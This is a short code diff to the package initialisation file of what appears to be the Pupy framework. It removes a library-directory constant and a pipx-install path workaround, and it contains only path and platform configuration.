@@ -4,7 +4,7 @@ __all__ = [
     'getLogger', 'PupyCmdLoop', 'PupyService',
     'PupyConfig', 'PupyServer', 'PupyModule',
     'Credentials', 'PupyClient',
-    'ROOT', 'PUPYLIB_DIR',
+    'ROOT',
     'HOST_SYSTEM', 'HOST_CPU_ARCH', 'HOST_OS_ARCH'
 ]
 
@@ -14,18 +14,10 @@ import platform
 import re
 
 ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
-PUPYLIB_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__)))
 HOST_SYSTEM = platform.system()
 HOST_CPU_ARCH = platform.architecture()[0]
 HOST_OS_ARCH = platform.machine()
 
-USE_PIPX = False
-# hotpatch for pipx installs. TODO: do this a cleaner way
-if "/pipx/venv" in ROOT:
-    res = re.findall("(.*/pipx/venvs/[^/]+)", ROOT)
-    if len(res) == 1:
-        ROOT = os.path.join(res[0], "data", "pupy")
-        USE_PIPX = True
 
 DEPS = [
         os.path.abspath(os.path.join(ROOT, 'library_patches_py3')),
